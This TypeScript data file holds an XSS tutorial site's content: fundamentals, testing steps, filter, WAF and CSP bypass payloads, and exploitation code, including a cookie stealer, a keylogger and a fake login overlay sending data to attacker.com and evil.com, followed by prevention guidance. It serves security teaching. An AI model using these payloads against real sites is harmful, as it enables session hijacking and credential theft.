// ============================================================
// Vex — Cross the line.
// Documentation content data — ported from original docs.html
// ============================================================

export interface DocSection {
  id: string;
  icon: string;
  title: string;
  color: string;
  subsections: DocSubsection[];
}

export interface DocSubsection {
  id: string;
  title: string;
  content?: string;
  items?: { icon: string; title: string; desc: string }[];
  types?: { icon: string; name: string; severity: string; desc: string; code: string; flow?: string[] }[];
  contexts?: { name: string; vuln: string; payload: string; result: string }[];
  steps?: string[];
  tools?: { name: string; desc: string; url?: string }[];
  techniques?: { name: string; code: string; note?: string }[];
  wafs?: { name: string; icon: string; code: string }[];
  cspTechniques?: { icon: string; name: string; desc: string; code: string }[];
  encodings?: { icon: string; name: string; code: string }[];
  events?: { category: string; items: string[] }[];
  rules?: { context: string; encoding: string }[] | string[];
  code?: string;
  links?: { name: string; url: string; desc?: string }[];
}

export const DOC_SECTIONS: DocSection[] = [
  {
    id: 'fundamentals',
    icon: '📖',
    title: 'XSS Fundamentals',
    color: '#00ff88',
    subsections: [
      {
        id: 'what-is-xss',
        title: 'What is Cross-Site Scripting?',
        content: 'Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When the victim loads the page, the malicious script executes in their browser context.',
        items: [
          { icon: '🔑', title: 'Steal Session Cookies', desc: 'Access authentication tokens and hijack user sessions' },
          { icon: '👤', title: 'Perform Actions as User', desc: 'Execute any action the user can perform on the website' },
          { icon: '👁️', title: 'Access Sensitive Data', desc: 'Read private information displayed on the page' },
          { icon: '🎣', title: 'Phishing Attacks', desc: 'Display fake forms to capture credentials' },
          { icon: '🔗', title: 'Malicious Redirects', desc: 'Redirect users to malicious websites' },
          { icon: '🌐', title: 'Network Reconnaissance', desc: 'Scan internal networks via the browser' },
        ],
      },
      {
        id: 'types-of-xss',
        title: 'Types of XSS Vulnerabilities',
        types: [
          {
            icon: '🔄', name: 'Reflected XSS', severity: 'High',
            desc: 'Payload is reflected off the web server as part of the response. Typically delivered via URL parameters.',
            code: `<!-- Vulnerable PHP -->
<h1>Welcome <?php echo $_GET['name']; ?>!</h1>

<!-- Malicious URL -->
https://example.com/welcome.php?name=<script>alert('XSS')</script>`,
            flow: ['Attacker crafts malicious URL', 'Victim clicks link', 'Server reflects payload', 'Script executes in browser'],
          },
          {
            icon: '💾', name: 'Stored XSS', severity: 'Critical',
            desc: 'Payload is permanently stored on the target server and served to all users who access the affected page.',
            code: `<!-- Vulnerable comment display -->
<div class="comment">
  <p><?php echo $comment['message']; ?></p>
</div>

<!-- Malicious comment -->
<script>document.location="http://evil.com/?c="+document.cookie</script>`,
            flow: ['Attacker submits payload via form', 'Script stored in database', 'Any user visiting triggers XSS', 'Persistent impact on all visitors'],
          },
          {
            icon: '🌐', name: 'DOM-Based XSS', severity: 'High',
            desc: 'Vulnerability exists in client-side JavaScript. The payload modifies the DOM without server interaction.',
            code: `// Vulnerable DOM manipulation
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello ' + name;

// Malicious URL
https://example.com/page.html#<img src=x onerror=alert(1)>`,
          },
        ],
      },
      {
        id: 'execution-contexts',
        title: 'Execution Contexts',
        content: 'Understanding where your payload executes is crucial. Different contexts require different approaches:',
        contexts: [
          { name: 'HTML Context', vuln: '<div>Hello $userInput</div>', payload: '<script>alert("XSS")</script>', result: '<div>Hello <script>alert("XSS")</script></div>' },
          { name: 'Attribute Context', vuln: '<input value="$userInput">', payload: '" onmouseover="alert(\'XSS\')', result: '<input value="" onmouseover="alert(\'XSS\')">' },
          { name: 'JavaScript Context', vuln: "<script>var x = '$userInput';</script>", payload: "';alert('XSS');//", result: "<script>var x = '';alert('XSS');//';</script>" },
          { name: 'URL Context', vuln: '<a href="$userURL">Click</a>', payload: "javascript:alert('XSS')", result: '<a href="javascript:alert(\'XSS\')">Click</a>' },
          { name: 'CSS Context', vuln: '<style>body{background:$color}</style>', payload: 'red}</style><script>alert(1)</script>', result: '<style>body{background:red}</style><script>alert(1)</script>' },
        ],
      },
    ],
  },
  {
    id: 'detection',
    icon: '🔍',
    title: 'Detection Techniques',
    color: '#00d4ff',
    subsections: [
      {
        id: 'manual-testing',
        title: 'Manual Testing Strategy',
        content: 'Manual testing remains one of the most effective ways to discover XSS vulnerabilities.',
        steps: [
          'Identify all input points: URL params, form fields, HTTP headers, cookies',
          'Test with simple HTML: <h1>test</h1>',
          'Test script execution: <script>alert(1)</script>',
          'Test event handlers: <img src=x onerror=alert(1)>',
          'Test context breaking: "><script>alert(1)</script>',
          'Try advanced payloads: <svg onload=alert(1)>',
          'Test encoding bypasses: %3Cscript%3Ealert(1)%3C/script%3E',
          'Check for DOM-based sinks: innerHTML, document.write, eval',
        ],
      },
      {
        id: 'automated-scanning',
        title: 'Scanning Tools',
        tools: [
          { name: 'Burp Suite Professional', desc: 'Industry standard web application security testing platform', url: 'https://portswigger.net/burp' },
          { name: 'OWASP ZAP', desc: 'Free and open-source security testing proxy', url: 'https://www.zaproxy.org/' },
          { name: 'XSSStrike', desc: 'Advanced XSS detection suite with fuzzing capabilities', url: 'https://github.com/s0md3v/XSStrike' },
          { name: 'XSSHunter', desc: 'Blind XSS detection platform for stored vulnerabilities', url: 'https://xsshunter.trufflesecurity.com/' },
          { name: 'Dalfox', desc: 'Fast XSS scanner and parameter analysis tool', url: 'https://github.com/hahwul/dalfox' },
          { name: 'XSSer', desc: 'Automatic XSS detection and exploitation framework', url: 'https://github.com/epsylon/xsser' },
        ],
      },
      {
        id: 'fuzzing-strategies',
        title: 'Fuzzing Strategies',
        content: 'Systematic fuzzing helps discover edge cases that manual testing might miss:',
        steps: [
          'Start with polyglot payloads that work across multiple contexts',
          'Fuzz special characters: < > " \' / \\ ; : = ( ) { } [ ]',
          'Test encoding permutations: URL, HTML entity, Unicode, hex',
          'Try null bytes and control characters as separators',
          'Test length boundaries and truncation behavior',
          'Fuzz HTTP headers: Referer, User-Agent, X-Forwarded-For',
        ],
      },
    ],
  },
  {
    id: 'bypass',
    icon: '🛡️',
    title: 'Bypass Techniques',
    color: '#ff8800',
    subsections: [
      {
        id: 'filter-evasion',
        title: 'Filter Evasion',
        content: 'When basic payloads are blocked, encoding and obfuscation techniques can bypass filters:',
        techniques: [
          { name: 'Case Manipulation', code: '<ScRiPt>alert(1)</ScRiPt>\n<SCRIPT>alert(1)</SCRIPT>\n<script\\t>alert(1)</script>' },
          { name: 'URL Encoding', code: '%3Cscript%3Ealert(1)%3C/script%3E\n%253Cscript%253Ealert(1)%253C/script%253E' },
          { name: 'HTML Entity Encoding', code: '&#60;script&#62;alert(1)&#60;/script&#62;\n&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;' },
          { name: 'Unicode Encoding', code: '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\n<\\u0073cript>alert(1)</\\u0073cript>' },
          { name: 'Null Byte Injection', code: '<scri\\x00pt>alert(1)</script>\n<img src=x on\\x00error=alert(1)>' },
          { name: 'Comment Insertion', code: '<scr<!---->ipt>alert(1)</script>\n<img src=x on/**/error=alert(1)>' },
        ],
      },
      {
        id: 'event-handlers',
        title: 'Alternative Event Handlers',
        content: 'When common event handlers are blocked, try these alternatives:',
        events: [
          { category: 'Mouse Events', items: ['onmouseover', 'onmouseout', 'onmousedown', 'onmouseup', 'onclick', 'ondblclick'] },
          { category: 'Keyboard Events', items: ['onkeydown', 'onkeyup', 'onkeypress'] },
          { category: 'Form Events', items: ['onfocus', 'onblur', 'onchange', 'onsubmit', 'oninput'] },
          { category: 'Media Events', items: ['onload', 'onerror', 'onresize', 'onscroll', 'oncanplay'] },
          { category: 'HTML5 Events', items: ['ontoggle', 'onpointerover', 'onanimationend', 'onautocomplete', 'onwheel'] },
        ],
      },
      {
        id: 'waf-bypasses',
        title: 'WAF Bypass Techniques',
        content: 'Web Application Firewalls implement various rules to block XSS. Here are proven bypass techniques:',
        wafs: [
          { name: 'Cloudflare', icon: '☁️', code: `# Unicode bypass
<script>alert\\u0028\\u0031\\u0029</script>

# Case variation
<ScRiPt>alert(1)</ScRiPt>

# Encoding combination
<script>eval(atob('YWxlcnQoMSk='))</script>

# Template literals
<script>alert\`1\`</script>` },
          { name: 'AWS WAF', icon: '🌩️', code: `# Mixed case with spaces
< ScRiPt >alert(1)</ ScRiPt >

# Alternative tags
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>

# Event handler variations
<img src=x oNlOaD=alert(1)>` },
          { name: 'ModSecurity', icon: '🔒', code: `# Comment injection
<script>/**/alert(1)</script>

# String concatenation
<script>alert(String.fromCharCode(49))</script>

# Alternative execution
<script>Function('alert(1)')()</script>` },
          { name: 'Akamai', icon: '🔷', code: `# Mixed case
<ScRiPt>alert(1)</ScRiPt>

# Attribute padding
<img src =x onerror =alert(1)>

# Unicode events
<img src=x oN\\u0065rror=alert(1)>` },
        ],
      },
      {
        id: 'csp-bypasses',
        title: 'CSP Bypasses',
        content: 'Content Security Policy (CSP) is a powerful defense mechanism, but certain configurations can be bypassed:',
        cspTechniques: [
          { icon: '📦', name: 'JSONP Endpoints', desc: 'If CSP allows certain domains, look for JSONP endpoints:', code: `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>
<div ng-app ng-csp ng-click=$event.view.alert(1337)>Click</div>` },
          { icon: '🔗', name: 'Base Tag Injection', desc: 'Manipulate relative URLs:', code: `<base href="//evil.com/">\n<script src="./legitimate-script.js"></script>` },
          { icon: '📝', name: 'Nonce/Hash Bypasses', desc: 'Look for nonce reuse or hash collisions:', code: `# Nonce reuse\n<script nonce="abc123">alert(1)</script>\n\n# Script gadgets on whitelisted CDNs\n<script src="https://allowed-cdn.com/angular.js"></script>` },
        ],
      },
      {
        id: 'encoding-tricks',
        title: 'Advanced Encoding',
        content: 'Various encoding methods can bypass filters that don\'t properly decode input:',
        encodings: [
          { icon: '🔢', name: 'Numeric Character References', code: '# Decimal\n&#60;script&#62;alert(1)&#60;/script&#62;\n\n# Hexadecimal\n&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;' },
          { icon: '🌐', name: 'Unicode Normalization', code: '# Unicode bypass\n<script>alert\\u0028\\u0031\\u0029</script>\n\n# Overlong encoding\n<script>eval(\'\\\\u{61}\\\\u{6C}\\\\u{65}\\\\u{72}\\\\u{74}(1)\')</script>' },
          { icon: '📦', name: 'Base64 & Alternative', code: '# Base64 payload\n<script>eval(atob(\'YWxlcnQoMSk=\'))</script>\n\n# FromCharCode\n<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>' },
          { icon: '⚡', name: 'Alternative Execution', code: '# Template literals\n<script>alert`1`</script>\n\n# Function constructor\n<script>[].constructor.constructor(\'alert(1)\')()</script>\n\n# setTimeout\n<script>setTimeout(\'alert(1)\',0)</script>' },
        ],
      },
    ],
  },
  {
    id: 'exploitation',
    icon: '🐛',
    title: 'Exploitation',
    color: '#ff3366',
    subsections: [
      {
        id: 'session-hijacking',
        title: 'Session Hijacking',
        content: 'The most common XSS exploitation technique — stealing session cookies to impersonate users.',
        code: `// Cookie stealer
new Image().src="https://attacker.com/steal?c="+document.cookie;

// Fetch-based exfiltration
fetch("https://attacker.com/log",{
  method:"POST",
  body:JSON.stringify({cookies:document.cookie,url:location.href})
});`,
      },
      {
        id: 'keylogging',
        title: 'Keylogging & Credential Theft',
        content: 'Capture keystrokes and form submissions to steal credentials.',
        code: `// Keylogger
document.addEventListener("keypress",function(e){
  new Image().src="https://attacker.com/log?k="+e.key;
});

// Form hijacking
document.forms[0].addEventListener("submit",function(){
  fetch("https://attacker.com/creds",{
    method:"POST", body:new FormData(this)
  });
});`,
      },
      {
        id: 'phishing',
        title: 'Phishing via XSS',
        content: 'Inject convincing fake login forms into legitimate websites.',
        code: `// Inject a fake login overlay
document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:99999"><div style="background:#fff;padding:40px;border-radius:12px;max-width:400px;width:90%"><h2>Session Expired</h2><p>Please log in again</p><form action="https://evil.com/phish"><input name="user" placeholder="Email"><input name="pass" type="password" placeholder="Password"><button>Sign In</button></form></div></div>';`,
      },
    ],
  },
  {
    id: 'prevention',
    icon: '🔒',
    title: 'Prevention',
    color: '#a855f7',
    subsections: [
      {
        id: 'output-encoding',
        title: 'Output Encoding',
        content: 'The primary defense against XSS — encode data before inserting it into the page:',
        rules: [
          { context: 'HTML Body', encoding: 'HTML Entity encode: & → &amp; < → &lt; > → &gt;' },
          { context: 'HTML Attributes', encoding: 'Attribute encode: " → &quot; \' → &#x27;' },
          { context: 'JavaScript', encoding: 'JavaScript encode: \\ → \\\\ \' → \\\'' },
          { context: 'URL Parameters', encoding: 'URL encode: encodeURIComponent()' },
          { context: 'CSS Values', encoding: 'CSS encode: \\HH format for special characters' },
        ],
      },
      {
        id: 'csp-implementation',
        title: 'Content Security Policy',
        content: 'CSP is a browser security mechanism that restricts content sources:',
        code: `Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';`,
      },
      {
        id: 'input-validation',
        title: 'Input Validation',
        content: 'Validate and sanitize all user input on both client and server side:',
        steps: [
          'Use allowlists over denylists wherever possible',
          'Validate data type, length, format, and range',
          'Use parameterized queries / prepared statements',
          'Implement strict Content-Type headers',
          'Set HttpOnly, Secure, SameSite cookie flags',
          'Use modern frameworks with auto-escaping (React, Angular, Vue)',
          'Implement Subresource Integrity (SRI) for external scripts',
        ],
      },
    ],
  },
  {
    id: 'resources',
    icon: '🛠️',
    title: 'Tools & Resources',
    color: '#eab308',
    subsections: [
      {
        id: 'references',
        title: 'Essential References',
        links: [
          { name: 'OWASP XSS Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html', desc: 'Official OWASP prevention guide' },
          { name: 'PortSwigger XSS Labs', url: 'https://portswigger.net/web-security/cross-site-scripting', desc: 'Hands-on XSS labs and tutorials' },
          { name: 'HackTricks XSS', url: 'https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting', desc: 'Comprehensive XSS techniques wiki' },
          { name: 'PayloadsAllTheThings', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection', desc: 'Massive payload collection on GitHub' },
          { name: 'PortSwigger XSS Cheat Sheet', url: 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet', desc: 'Interactive cheat sheet with event handlers' },
          { name: 'XSS in 2020 by Sam Anttila', url: 'https://netsec.expert/posts/xss-in-2020/', desc: 'Advanced research techniques' },
        ],
      },
    ],
  },
];
